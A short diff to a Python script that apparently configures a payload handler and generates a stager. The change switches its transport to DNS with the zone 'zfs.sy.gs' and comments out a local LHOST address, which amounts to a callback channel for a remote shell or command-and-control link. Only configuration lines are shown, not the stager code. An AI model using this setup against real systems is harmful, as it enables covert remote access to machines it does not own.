@@ -11,12 +11,14 @@ handler = Handler()
 
 #handler.setoption("LHOST", "127.0.0.1")
 #handler.setoption("LPORT", "0")
-#handler.setoption("TRANSPORT", "TEST")
+handler.setoption("TRANSPORT", "DNS")
+handler.setoption("ZONE", "zfs.sy.gs")
+#handler.setoption("LPORT", "5000")
 #handler.setoption("BLUB", "TEST")
 
 #handler.setoption("STAGEENCODING", "FALSE")
 #handler.setoption("STAGEAUTHENTICATION", "FALSE")
-handler.setoption("LHOST", "10.201.1.83")
+#handler.setoption("LHOST", "10.201.1.83")
 
 handler.generatestager()
 
